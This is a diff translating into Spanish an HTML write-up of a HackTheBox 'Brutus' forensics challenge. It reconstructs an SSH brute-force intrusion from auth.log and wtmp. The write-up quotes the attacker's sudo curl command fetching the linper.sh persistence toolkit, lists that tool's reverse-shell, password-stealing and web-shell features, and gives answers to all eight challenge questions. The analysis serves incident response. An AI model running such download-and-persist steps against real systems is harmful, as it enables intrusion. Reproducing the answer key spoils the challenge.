+            <div class="tl-desc">cyberjunkie ejecuta un comando curl con privilegios sudo para descargar <strong style="color:var(--red)">linper.sh</strong> desde GitHub — un toolkit de automatización de persistencia en Linux. Despliegue de persistencia de segunda fase.</div>
           </div>
         </div>
       </section>
 
-      <!-- 3. Forensic Analysis -->
-      <section class="section" id="analysis">
+      <!-- 3. Análisis Forense -->
+      <section class="section" id="analisis">
         <div class="section-header">
           <div class="section-number">3</div>
-          <h2>Forensic Log Analysis</h2>
+          <h2>Análisis Forense de Logs</h2>
         </div>
         <p>
-          The analysis focuses on parsing and correlating entries from two complementary log sources. Each provides different perspectives on the same attack.
+          El análisis requiere parsear y correlacionar entradas de dos fuentes de log complementarias. Cada una ofrece una perspectiva distinta del mismo ataque.
         </p>
 
         <div class="card">
-          <h3>📋 auth.log — Authentication Events</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">The primary source for identifying the brute-force origin, authentication success, and post-exploitation activity.</p>
+          <h3>📋 auth.log — Eventos de Autenticación</h3>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">Fuente principal para identificar el origen de la fuerza bruta, el éxito de la autenticación y la actividad post-explotación.</p>
           <div class="code-block">
-            <div class="code-label">📄 <span>auth.log — key entries</span></div>
+            <div class="code-label">📄 <span>auth.log — entradas clave</span></div>
             <div class="code-body">
-<span class="comment"># Brute force entries — hundreds of these</span>
+<span class="comment"># Entradas de fuerza bruta — cientos de estas</span>
 <span class="timestamp">Mar  6 06:31:31</span> server sshd[2411]: <span class="highlight">Invalid user</span> admin from <span class="ip">65.2.161.68</span>
 <span class="timestamp">Mar  6 06:31:33</span> server sshd[2411]: <span class="highlight">Failed password</span> for root from <span class="ip">65.2.161.68</span>
 
-<span class="comment"># Brute force success</span>
+<span class="comment"># Éxito de la fuerza bruta</span>
 <span class="timestamp">Mar  6 06:31:40</span> server sshd[2411]: <span class="cmd">Accepted password</span> for <span class="user">root</span> from <span class="ip">65.2.161.68</span> port 34782 ssh2
 
-<span class="comment"># Backdoor account creation</span>
-<span class="timestamp">Mar  6 06:34:18</span> server useradd[2502]: <span class="cmd">new user</span>: name=<span class="user">cyberjunkie</span>, ...
+<span class="comment"># Creación de la cuenta backdoor</span>
+<span class="timestamp">Mar  6 06:34:18</span> server useradd[2502]: <span class="cmd">new user</span>: name=<span class="user">cyberjunkie</span>, uid=1002, gid=1002 ...
 
-<span class="comment"># Session 37 assigned to root</span>
+<span class="comment"># Sesión PAM #37 asignada a root</span>
 <span class="timestamp">Mar  6 06:32:44</span> server sshd[2411]: pam_unix(sshd:session): <span class="cmd">session opened</span> for user <span class="user">root</span> by (uid=0)
-<span class="comment"># PAM session ID: 37</span>
 
-<span class="comment"># First session end</span>
+<span class="comment"># Cierre de primera sesión</span>
 <span class="timestamp">Mar  6 06:37:24</span> server sshd[2411]: pam_unix(sshd:session): <span class="cmd">session closed</span> for user <span class="user">root</span>
 
-<span class="comment"># Sudo command by cyberjunkie</span>
+<span class="comment"># Comando sudo de cyberjunkie</span>
 <span class="timestamp">Mar  6 06:39:38</span> server sudo: <span class="user">cyberjunkie</span> : TTY=pts/1 ; PWD=/home/cyberjunkie ;
     USER=root ; <span class="cmd">COMMAND=</span><span class="path">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span>
             </div>
@@ -555,72 +383,72 @@
         </div>
 
         <div class="card">
-          <h3>🗂️ wtmp — Session Records (Binary → Text)</h3>
-          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">wtmp captures the actual interactive session, which is why the timestamp differs from auth.log. Parsed with <code style="font-family:monospace;color:var(--accent)">utmpdump /var/log/wtmp</code> or <code style="font-family:monospace;color:var(--accent)">last -F -f wtmp</code>.</p>
+          <h3>🗂️ wtmp — Registros de Sesión (Binario → Texto)</h3>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">wtmp captura la sesión interactiva real, de ahí que su timestamp difiera del de auth.log. Se analiza con <code style="font-family:monospace;color:var(--accent)">utmpdump</code> o <code style="font-family:monospace;color:var(--accent)">last -F -f wtmp</code>.</p>
           <div class="callout callout-warn">
             <span class="callout-icon">⚠️</span>
             <div class="callout-content">
-              <strong>Why auth.log and wtmp timestamps differ:</strong> auth.log records when PAM authenticates the user. wtmp records when the interactive terminal (PTY) is fully established. The attacker authenticated at 06:31:40 but the manual interactive session was not recorded by wtmp until 06:32:45 — a ~65 second delta.
+              <strong>Por qué difieren los timestamps de auth.log y wtmp:</strong> auth.log registra cuándo PAM autentica al usuario. wtmp registra cuándo el terminal interactivo (PTY) queda completamente establecido. El atacante se autenticó a las 06:31:40, pero la sesión interactiva manual no fue registrada por wtmp hasta las 06:32:45 — un delta de ~65 segundos.
             </div>
           </div>
           <div class="code-block">
-            <div class="code-label">💻 <span>Linux Command</span> — parse wtmp</div>
+            <div class="code-label">💻 <span>Comando Linux</span> — parsear wtmp</div>
             <div class="code-body">
-<span class="comment"># Parse binary wtmp to human-readable</span>
+<span class="comment"># Convertir wtmp binario a texto legible</span>
 <span class="cmd">utmpdump</span> <span class="path">/var/log/wtmp</span>
 
-<span class="comment"># Alternative with timestamps</span>
+<span class="comment"># Alternativa con timestamps completos</span>
 <span class="cmd">last</span> <span class="param">-F</span> <span class="param">-f</span> <span class="path">wtmp</span>
 
-<span class="comment"># Output for attacker session:</span>
+<span class="comment"># Resultado para la sesión del atacante:</span>
 <span class="comment"># root   pts/0   65.2.161.68   Wed Mar  6 06:32:45 2024</span>
             </div>
           </div>
         </div>
       </section>
 
-      <!-- 4. linper.sh Deep Dive -->
+      <!-- 4. linper.sh -->
       <section class="section" id="linper">
         <div class="section-header">
           <div class="section-number">4</div>
-          <h2>linper.sh — Linux Persistence Toolkit</h2>
+          <h2>linper.sh — Toolkit de Persistencia en Linux</h2>
         </div>
         <p>
-          The final malicious command executed by the attacker was a sudo-privileged download of <strong>linper.sh</strong> — an open-source Linux persistence automation toolkit hosted on GitHub (github.com/montysecurity/linper). Originally designed for red team CTF use, the tool automates the installation of multiple persistence mechanisms simultaneously.
+          El último comando malicioso ejecutado por el atacante fue la descarga con privilegios sudo de <strong>linper.sh</strong>, un toolkit de automatización de persistencia en Linux alojado en GitHub (github.com/montysecurity/linper). Aunque fue diseñado originalmente para uso en CTF y red team, el atacante lo utilizó para establecer múltiples mecanismos de persistencia de forma simultánea.
         </p>
 
         <div class="highlight-box" style="border-left-color: var(--red);">
-          <div class="label">Malicious Command Executed</div>
+          <div class="label">Comando Malicioso Ejecutado</div>
           <div class="value">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</div>
         </div>
 
         <div class="linper-box">
-          <div class="title">🛠️ linper.sh — Persistence Capabilities</div>
-          <p style="font-size:12.5px;color:var(--text-muted);margin-bottom:6px;">The toolkit enumerates available binaries and persistence vectors, then automatically installs reverse shells and backdoors across multiple mechanisms.</p>
+          <div class="title">🛠️ linper.sh — Capacidades de Persistencia</div>
+          <p style="font-size:12.5px;color:var(--text-muted);margin-bottom:6px;">El toolkit enumera los binarios disponibles y los vectores de persistencia del sistema, instalando automáticamente reverse shells y backdoors a través de múltiples mecanismos.</p>
           <div class="linper-grid">
             <div class="linper-feature">
-              <div class="feat-title">⏰ Crontab Persistence</div>
-              <div class="feat-desc">Installs reverse shell cron jobs that execute at scheduled intervals, surviving reboots.</div>
+              <div class="feat-title">⏰ Persistencia por Crontab</div>
+              <div class="feat-desc">Instala reverse shells como cron jobs que se ejecutan en intervalos programados y sobreviven reinicios del sistema.</div>
             </div>
             <div class="linper-feature">
-              <div class="feat-title">🔐 sudo Password Hijack</div>
-              <div class="feat-desc">Injects a function into ~/.bashrc to intercept and exfiltrate sudo passwords silently.</div>
+              <div class="feat-title">🔐 Secuestro de Contraseñas sudo</div>
+              <div class="feat-desc">Inyecta una función en ~/.bashrc para interceptar y exfiltrar contraseñas sudo de forma silenciosa.</div>
             </div>
             <div class="linper-feature">
-              <div class="feat-title">🌐 Web Shell Deployment</div>
-              <div class="feat-desc">Places PHP reverse shells in web server directories (Apache/Nginx) if writable.</div>
+              <div class="feat-title">🌐 Despliegue de Web Shell</div>
+              <div class="feat-desc">Coloca reverse shells PHP en directorios del servidor web (Apache/Nginx) si tienen permisos de escritura.</div>
             </div>
             <div class="linper-feature">
-              <div class="feat-title">👁️ Shadow File Enum</div>
-              <div class="feat-desc">Checks readability of /etc/shadow to exfiltrate hashed passwords for offline cracking.</div>
+              <div class="feat-title">👁️ Enumeración de /etc/shadow</div>
+              <div class="feat-desc">Comprueba si /etc/shadow es legible para exfiltrar hashes de contraseñas y proceder con cracking offline.</div>
             </div>
             <div class="linper-feature">
-              <div class="feat-title">🥷 Stealth Mode</div>
-              <div class="feat-desc">Applies obfuscation techniques to hide installed backdoors from human reviewers.</div>
+              <div class="feat-title">🥷 Modo Sigiloso</div>
+              <div class="feat-desc">Aplica técnicas de ofuscación para ocultar los backdoors instalados ante revisiones manuales del sistema.</div>
             </div>
             <div class="linper-feature">
-              <div class="feat-title">🔄 Cleanup Capability</div>
-              <div class="feat-desc">Includes a removal function to erase all installed persistence, covering tracks on demand.</div>
+              <div class="feat-title">🔄 Función de Limpieza</div>
+              <div class="feat-desc">Incluye una función de eliminación que borra toda la persistencia instalada, borrando rastros bajo demanda.</div>
             </div>
           </div>
         </div>
@@ -628,129 +456,129 @@
         <div class="callout callout-danger">
           <span class="callout-icon">🚨</span>
           <div class="callout-content">
-            <strong>Threat context:</strong> The attacker already had persistent access via the <code style="font-family:monospace;color:var(--accent)">cyberjunkie</code> backdoor account. Downloading linper.sh indicates intent to establish <em>multiple additional persistence mechanisms</em> — making remediation significantly more complex. All crontabs, bashrc files, and web directories would need to be audited.
+            <strong>Contexto de amenaza:</strong> El atacante ya contaba con acceso persistente mediante la cuenta backdoor <code style="font-family:monospace;color:var(--accent)">cyberjunkie</code>. La descarga de linper.sh indica la intención de establecer <em>múltiples mecanismos de persistencia adicionales</em>, lo que complica enormemente la respuesta al incidente: habría que auditar todos los crontabs, archivos bashrc y directorios web del servidor.
           </div>
         </div>
       </section>
 
-      <!-- 5. Task Walkthrough -->
-      <section class="section" id="tasks">
+      <!-- 5. Resolución de Tareas -->
+      <section class="section" id="tareas">
         <div class="section-header">
           <div class="section-number">5</div>
-          <h2>Task Walkthrough</h2>
+          <h2>Resolución de Tareas</h2>
         </div>
-        <p>Complete resolution of all 8 challenge questions with forensic methodology.</p>
+        <p>Resolución completa de las 8 preguntas del reto con metodología forense detallada.</p>
 
         <div class="task-list">
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">1</div>
-              <div class="task-question">Analyze auth.log. What is the IP address that the attacker used to perform the brute-force attack?</div>
+              <div class="task-question">Analiza el archivo auth.log. ¿Cuál es la dirección IP que utilizó el atacante para realizar el ataque de fuerza bruta?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">65.2.161.68</span>
               </div>
-              <div class="task-explanation">Filtering auth.log for repeated "Failed password" and "Invalid user" entries from a single IP reveals 65.2.161.68 as the attack source. The volume and speed of failed attempts is a classic SSH brute-force signature.</div>
+              <div class="task-explanation">Filtrando auth.log por entradas repetidas de "Failed password" e "Invalid user" desde una única IP, se identifica 65.2.161.68 como el origen del ataque. El volumen y la velocidad de los intentos fallidos son la firma característica de un ataque de fuerza bruta SSH.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">2</div>
-              <div class="task-question">The brute force attempts were successful and the attacker gained access to an account. What is the username of that account?</div>
+              <div class="task-question">Los intentos de fuerza bruta tuvieron éxito y el atacante obtuvo acceso a una cuenta. ¿Cuál es el nombre de usuario de esa cuenta?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">root</span>
               </div>
-              <div class="task-explanation">auth.log entry: <code style="font-family:monospace;color:var(--accent)">Accepted password for root from 65.2.161.68</code>. The attacker targeted the highest-privilege account directly, which is common when targeting internet-exposed SSH services without fail2ban or account lockout policies.</div>
+              <div class="task-explanation">Entrada en auth.log: <code style="font-family:monospace;color:var(--accent)">Accepted password for root from 65.2.161.68</code>. El atacante apuntó directamente a la cuenta con máximos privilegios, lo cual es habitual cuando el servicio SSH está expuesto a Internet sin políticas de bloqueo de cuentas ni fail2ban.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">3</div>
-              <div class="task-question">Identify the UTC timestamp when the attacker manually logged in to the server and established an interactive terminal session. This will differ from the authentication time and can be found in the wtmp artifact.</div>
+              <div class="task-question">Identifica el timestamp UTC en el que el atacante inició sesión manualmente en el servidor y estableció una sesión de terminal interactiva. Difiere del tiempo de autenticación y se encuentra en el artefacto wtmp.</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">2024-03-06 06:32:45</span>
               </div>
-              <div class="task-explanation">Parsed from wtmp using <code style="font-family:monospace;color:var(--accent)">utmpdump</code>. The 65-second delta between auth.log (06:31:40) and wtmp (06:32:45) represents the time between credential acceptance and the attacker actively establishing the interactive PTY session.</div>
+              <div class="task-explanation">Extraído del archivo wtmp con <code style="font-family:monospace;color:var(--accent)">utmpdump</code>. El delta de 65 segundos entre auth.log (06:31:40) y wtmp (06:32:45) representa el tiempo transcurrido entre la aceptación de credenciales y el momento en que el atacante establece activamente el terminal interactivo PTY.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">4</div>
-              <div class="task-question">SSH login sessions are tracked and assigned a session number upon logging in. What is the session number assigned to the attacker's session for the user account from Question 2?</div>
+              <div class="task-question">Las sesiones SSH se rastrean y se les asigna un número al iniciar sesión. ¿Cuál es el número de sesión asignado a la sesión del atacante para la cuenta de la Pregunta 2?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">37</span>
               </div>
-              <div class="task-explanation">Found in auth.log via PAM session management entries. PAM assigns sequential session IDs — searching for the root session associated with 65.2.161.68 yields session ID 37. This ID can be used to correlate all events within the same login session.</div>
+              <div class="task-explanation">Encontrado en auth.log mediante las entradas de gestión de sesiones PAM. PAM asigna IDs de sesión secuenciales — buscando la sesión root asociada a 65.2.161.68 se obtiene el ID de sesión 37. Este ID permite correlacionar todos los eventos ocurridos dentro de la misma sesión de login.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">5</div>
-              <div class="task-question">The attacker added a new user as part of their persistence strategy on the server and granted them elevated privileges. What is the name of this account?</div>
+              <div class="task-question">El atacante añadió un nuevo usuario como parte de su estrategia de persistencia y le otorgó privilegios elevados. ¿Cómo se llama esa cuenta?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">cyberjunkie</span>
               </div>
-              <div class="task-explanation">auth.log records a <code style="font-family:monospace;color:var(--accent)">useradd</code> event for user <code style="font-family:monospace;color:var(--accent)">cyberjunkie</code> initiated from the compromised root session. The account was also added to the sudo group (elevated privileges), providing the attacker with a second way to return even if the root password was later changed.</div>
+              <div class="task-explanation">auth.log registra un evento <code style="font-family:monospace;color:var(--accent)">useradd</code> para el usuario <code style="font-family:monospace;color:var(--accent)">cyberjunkie</code> iniciado desde la sesión root comprometida. La cuenta fue añadida también al grupo sudo (privilegios elevados), proporcionando al atacante una segunda vía de acceso incluso si se cambia la contraseña de root.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">6</div>
-              <div class="task-question">What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?</div>
+              <div class="task-question">¿Cuál es el ID de subtécnica MITRE ATT&CK utilizado para la persistencia mediante la creación de una nueva cuenta?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">T1136.001</span>
               </div>
-              <div class="task-explanation"><strong>T1136 — Create Account / T1136.001 — Local Account.</strong> Adversaries create local accounts to maintain persistent access. Since the backdoor account has sudo privileges, it functionally provides equivalent access to root, making it a high-value persistence mechanism that survives password resets on the original compromised account.</div>
+              <div class="task-explanation"><strong>T1136 — Create Account / T1136.001 — Local Account.</strong> Los adversarios crean cuentas locales para mantener acceso persistente. Dado que la cuenta backdoor dispone de privilegios sudo, proporciona acceso equivalente a root de forma funcional, convirtiéndola en un mecanismo de persistencia de alto valor que sobrevive al reseteo de contraseñas en la cuenta comprometida originalmente.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">7</div>
-              <div class="task-question">What time did the attacker's first SSH session end according to auth.log?</div>
+              <div class="task-question">¿A qué hora finalizó la primera sesión SSH del atacante según auth.log?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">2024-03-06 06:37:24</span>
               </div>
-              <div class="task-explanation">auth.log records a PAM session close event for the root session at this timestamp. The first session lasted approximately 4 minutes and 44 seconds — enough time to create the backdoor account and survey the environment before logging out and re-entering via the cyberjunkie account.</div>
+              <div class="task-explanation">auth.log registra un evento de cierre de sesión PAM para la sesión root en este timestamp. La primera sesión duró aproximadamente 4 minutos y 44 segundos — tiempo suficiente para crear la cuenta backdoor y explorar el entorno antes de desconectarse y volver a entrar mediante la cuenta cyberjunkie.</div>
             </div>
           </div>
 
           <div class="task-item">
             <div class="task-q">
               <div class="task-num">8</div>
-              <div class="task-question">The attacker logged back in to their backdoor account and used its privileges to download a script. What is the full command executed with sudo?</div>
+              <div class="task-question">El atacante volvió a iniciar sesión en su cuenta backdoor y utilizó sus privilegios para descargar un script. ¿Cuál es el comando completo ejecutado con sudo?</div>
             </div>
             <div class="task-a">
               <div class="task-answer-row">
-                <span class="task-answer-label">Answer</span>
+                <span class="task-answer-label">Respuesta</span>
                 <span class="task-answer-val">/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span>
               </div>
-              <div class="task-explanation">auth.log captures full sudo command invocations, including the complete command path and arguments. The attacker used the cyberjunkie account's sudo privileges to download linper.sh — a Linux persistence toolkit — directly from GitHub using curl. The full path <code style="font-family:monospace;color:var(--accent)">/usr/bin/curl</code> is required for sudo execution.</div>
+              <div class="task-explanation">auth.log captura las invocaciones completas de comandos sudo, incluyendo la ruta completa y los argumentos. El atacante usó los privilegios sudo de cyberjunkie para descargar linper.sh directamente desde GitHub usando curl. La ruta completa <code style="font-family:monospace;color:var(--accent)">/usr/bin/curl</code> es necesaria para la ejecución con sudo.</div>
             </div>
           </div>
         </div>
@@ -760,90 +588,90 @@
       <section class="section" id="mitre">
         <div class="section-header">
           <div class="section-number">6</div>
-          <h2>MITRE ATT&CK Mapping</h2>
+          <h2>Mapeo MITRE ATT&CK</h2>
         </div>
 
         <table class="data-table">
           <thead>
             <tr>
-              <th>Technique ID</th>
-              <th>Technique Name</th>
-              <th>Phase</th>
-              <th>Evidence</th>
+              <th>ID de Técnica</th>
+              <th>Nombre de Técnica</th>
+              <th>Fase</th>
+              <th>Evidencia</th>
             </tr>
           </thead>
           <tbody>
             <tr>
               <td><code>T1110.001</code></td>
               <td>Brute Force: Password Guessing</td>
-              <td><span class="badge badge-red">Initial Access</span></td>
-              <td>Hundreds of failed SSH auth attempts from 65.2.161.68</td>
+              <td><span class="badge badge-red">Acceso Inicial</span></td>
+              <td>Cientos de intentos SSH fallidos desde 65.2.161.68</td>
             </tr>
             <tr>
               <td><code>T1078.003</code></td>
               <td>Valid Accounts: Local Accounts</td>
-              <td><span class="badge badge-red">Initial Access</span></td>
-              <td>Root account compromised via brute force</td>
+              <td><span class="badge badge-red">Acceso Inicial</span></td>
+              <td>Cuenta root comprometida por fuerza bruta</td>
             </tr>
             <tr>
               <td><code>T1059.004</code></td>
               <td>Command and Scripting: Unix Shell</td>
-              <td><span class="badge badge-orange">Execution</span></td>
-              <td>Interactive bash session established via SSH</td>
+              <td><span class="badge badge-orange">Ejecución</span></td>
+              <td>Sesión bash interactiva establecida vía SSH</td>
             </tr>
             <tr>
               <td><code>T1136.001</code></td>
               <td>Create Account: Local Account</td>
-              <td><span class="badge badge-purple">Persistence</span></td>
-              <td>cyberjunkie backdoor account created with sudo privileges</td>
+              <td><span class="badge badge-purple">Persistencia</span></td>
+              <td>Cuenta backdoor cyberjunkie creada con privilegios sudo</td>
             </tr>
             <tr>
               <td><code>T1098</code></td>
               <td>Account Manipulation</td>
-              <td><span class="badge badge-purple">Persistence</span></td>
-              <td>cyberjunkie added to privileged groups (sudo)</td>
+              <td><span class="badge badge-purple">Persistencia</span></td>
+              <td>cyberjunkie añadida a grupos privilegiados (sudo)</td>
             </tr>
             <tr>
               <td><code>T1105</code></td>
               <td>Ingress Tool Transfer</td>
-              <td><span class="badge badge-yellow">C2 / Tool Transfer</span></td>
-              <td>curl download of linper.sh from raw.githubusercontent.com</td>
+              <td><span class="badge badge-yellow">Transferencia de Herramienta</span></td>
+              <td>Descarga de linper.sh desde raw.githubusercontent.com con curl</td>
             </tr>
           </tbody>
         </table>
       </section>
 
-      <!-- 7. Recommendations -->
-      <section class="section" id="recommendations">
+      <!-- 7. Detección y Hardening -->
+      <section class="section" id="hardening">
         <div class="section-header">
           <div class="section-number">7</div>
-          <h2>Detection &amp; Hardening</h2>
+          <h2>Detección y Hardening</h2>
         </div>
 
         <div class="rec-grid">
           <div class="rec-card">
-            <div class="rec-title">🚫 Disable Root SSH Login</div>
-            <div class="rec-body">Set <code style="font-family:monospace;color:var(--accent)">PermitRootLogin no</code> in <code style="font-family:monospace;color:var(--accent)">/etc/ssh/sshd_config</code>. The entire attack chain depended on the attacker being able to authenticate as root directly.</div>
+            <div class="rec-title">🚫 Deshabilitar Login SSH como Root</div>
+            <div class="rec-body">Configurar <code style="font-family:monospace;color:var(--accent)">PermitRootLogin no</code> en <code style="font-family:monospace;color:var(--accent)">/etc/ssh/sshd_config</code>. Toda la cadena de ataque dependía de poder autenticarse directamente como root.</div>
           </div>
           <div class="rec-card">
-            <div class="rec-title">🔑 Enforce SSH Key Authentication</div>
-            <div class="rec-body">Disable password-based SSH (<code style="font-family:monospace;color:var(--accent)">PasswordAuthentication no</code>). Key-based auth is immune to brute-force attacks entirely.</div>
+            <div class="rec-title">🔑 Autenticación por Clave SSH</div>
+            <div class="rec-body">Deshabilitar autenticación por contraseña (<code style="font-family:monospace;color:var(--accent)">PasswordAuthentication no</code>). La autenticación por clave es inmune a los ataques de fuerza bruta.</div>
           </div>
           <div class="rec-card">
-            <div class="rec-title">🛡️ Deploy fail2ban</div>
-            <div class="rec-body">Automatically ban IPs after N failed attempts. The brute force succeeded in under 10 seconds — fail2ban with a 5-attempt threshold would have blocked the attack before success.</div>
+            <div class="rec-title">🛡️ Implementar fail2ban</div>
+            <div class="rec-body">Bloquear automáticamente IPs tras N intentos fallidos. La fuerza bruta tuvo éxito en menos de 10 segundos — fail2ban con umbral de 5 intentos habría bloqueado el ataque antes de que tuviera éxito.</div>
           </div>
           <div class="rec-card">
-            <div class="rec-title">📊 Monitor useradd / usermod Events</div>
-            <div class="rec-body">Alert on any new local account creation or group membership changes outside of approved change windows. T1136.001 detection should be a baseline SIEM rule.</div>
+            <div class="rec-title">📊 Monitorizar useradd / usermod</div>
+            <div class="rec-body">Alertar sobre cualquier creación de cuenta local o cambio en membresías de grupos fuera de ventanas de cambio aprobadas. La detección de T1136.001 debe ser una regla base en el SIEM.</div>
           </div>
           <div class="rec-card">
-            <div class="rec-title">🌐 Egress Filtering + Allowlist</div>
-            <div class="rec-body">Block outbound curl/wget to unapproved domains from server processes. The linper.sh download required outbound HTTP to raw.githubusercontent.com — controllable at the network level.</div>
+            <div class="rec-title">🌐 Filtrado de Tráfico Saliente</div>
+            <div class="rec-body">Bloquear solicitudes curl/wget a dominios no autorizados desde procesos del servidor. La descarga de linper.sh requería HTTP saliente a raw.githubusercontent.com — controlable a nivel de red.</div>
           </div>
           <div class="rec-card">
-            <div class="rec-title">🔍 Audit auth.log in SIEM</div>
-            <div class="rec-body">Forward auth.log to a centralized SIEM in real-time. Key detection rules: spike in "Failed password" events, "Accepted password for root", and sudo commands to curl/wget/bash.</div>
+            <div class="rec-title">🔍 Centralizar auth.log en SIEM</div>
+            <div class="rec-body">Enviar auth.log a un SIEM centralizado en tiempo real. Reglas de detección clave: pico de "Failed password", "Accepted password for root", y comandos sudo invocando curl/wget/bash.</div>
           </div>
         </div>
       </section>
@@ -854,55 +682,55 @@
     <aside class="sidebar">
 
       <div class="sidebar-card">
-        <h4>Challenge Details</h4>
-        <div class="detail-row"><span class="detail-label">Platform</span><span class="detail-value">HackTheBox Sherlock</span></div>
-        <div class="detail-row"><span class="detail-label">Challenge</span><span class="detail-value green">Brutus</span></div>
-        <div class="detail-row"><span class="detail-label">Category</span><span class="detail-value">DFIR</span></div>
-        <div class="detail-row"><span class="detail-label">Difficulty</span><span class="detail-value green">Very Easy</span></div>
-        <div class="detail-row"><span class="detail-label">Rating</span><span class="detail-value">4.7 / 5.0</span></div>
-        <div class="detail-row"><span class="detail-label">Status</span><span class="detail-value green">✓ Pwned</span></div>
-        <div class="detail-row"><span class="detail-label">Attacker IP</span><span class="detail-value" style="font-family:monospace;font-size:11px;">65.2.161.68</span></div>
-        <div class="detail-row"><span class="detail-label">Backdoor User</span><span class="detail-value" style="font-family:monospace;font-size:11px;">cyberjunkie</span></div>
-        <div class="detail-row"><span class="detail-label">Persistence</span><span class="detail-value">T1136.001</span></div>
+        <h4>Detalles del Reto</h4>
+        <div class="detail-row"><span class="detail-label">Plataforma</span><span class="detail-value">HackTheBox Sherlock</span></div>
+        <div class="detail-row"><span class="detail-label">Reto</span><span class="detail-value green">Brutus</span></div>
+        <div class="detail-row"><span class="detail-label">Categoría</span><span class="detail-value">DFIR</span></div>
+        <div class="detail-row"><span class="detail-label">Dificultad</span><span class="detail-value green">Muy Fácil</span></div>
+        <div class="detail-row"><span class="detail-label">Puntuación</span><span class="detail-value">4.7 / 5.0</span></div>
+        <div class="detail-row"><span class="detail-label">Estado</span><span class="detail-value green">✓ Completado</span></div>
+        <div class="detail-row"><span class="detail-label">IP Atacante</span><span class="detail-value" style="font-family:monospace;font-size:11px;">65.2.161.68</span></div>
+        <div class="detail-row"><span class="detail-label">Backdoor</span><span class="detail-value" style="font-family:monospace;font-size:11px;">cyberjunkie</span></div>
+        <div class="detail-row"><span class="detail-label">Persistencia</span><span class="detail-value">T1136.001</span></div>
       </div>
 
       <div class="sidebar-card">
-        <h4>Skills Demonstrated</h4>
+        <h4>Habilidades Demostradas</h4>
         <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">Linux Log Analysis</span><span class="skill-pct">95%</span></div>
+          <div class="skill-header"><span class="skill-name">Análisis de Logs Linux</span><span class="skill-pct">95%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
         </div>
         <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">auth.log Forensics</span><span class="skill-pct">92%</span></div>
+          <div class="skill-header"><span class="skill-name">Forense de auth.log</span><span class="skill-pct">92%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div>
         </div>
         <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">wtmp / UTMP Analysis</span><span class="skill-pct">88%</span></div>
+          <div class="skill-header"><span class="skill-name">Análisis de wtmp / UTMP</span><span class="skill-pct">88%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
         </div>
         <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">Persistence Detection</span><span class="skill-pct">85%</span></div>
+          <div class="skill-header"><span class="skill-name">Detección de Persistencia</span><span class="skill-pct">85%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
         </div>
         <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">MITRE ATT&CK Mapping</span><span class="skill-pct">90%</span></div>
+          <div class="skill-header"><span class="skill-name">Mapeo MITRE ATT&CK</span><span class="skill-pct">90%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
         </div>
         <div class="skill-item">
-          <div class="skill-header"><span class="skill-name">Incident Timeline Recon</span><span class="skill-pct">93%</span></div>
+          <div class="skill-header"><span class="skill-name">Reconstrucción de Timeline</span><span class="skill-pct">93%</span></div>
           <div class="skill-bar"><div class="skill-fill" style="width:93%"></div></div>
         </div>
       </div>
 
       <div class="sidebar-card">
-        <h4>Tools &amp; Artifacts</h4>
+        <h4>Herramientas y Artefactos</h4>
         <div class="tool-list">
           <div class="tool-item"><span class="tool-icon">📄</span>auth.log</div>
-          <div class="tool-item"><span class="tool-icon">🗂️</span>wtmp (UTMP format)</div>
+          <div class="tool-item"><span class="tool-icon">🗂️</span>wtmp (formato UTMP)</div>
           <div class="tool-item"><span class="tool-icon">💻</span>utmpdump</div>
           <div class="tool-item"><span class="tool-icon">🔍</span>grep / awk / sed</div>
           <div class="tool-item"><span class="tool-icon">📊</span>last -F -f wtmp</div>
-          <div class="tool-item"><span class="tool-icon">⚠️</span>linper.sh (attacker tool)</div>
+          <div class="tool-item"><span class="tool-icon">⚠️</span>linper.sh (herramienta atacante)</div>
         </div>
       </div>
 
@@ -919,15 +747,15 @@
       </div>
 
       <div class="sidebar-card">
